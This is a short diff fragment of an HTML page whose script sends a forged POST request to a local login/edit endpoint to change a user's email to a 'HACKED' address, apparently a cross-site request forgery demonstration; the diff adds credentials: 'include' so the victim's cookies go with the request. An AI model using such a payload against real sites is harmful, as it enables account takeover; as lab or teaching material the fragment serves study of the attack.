@@ -13,6 +13,7 @@
     <script>
       fetch('http://localhost:3333/login/edit', {
         method: 'POST',
+        credentials: 'include',
         body: {
           email: 'HACKED_sinqueteenteres@test.com',
         },
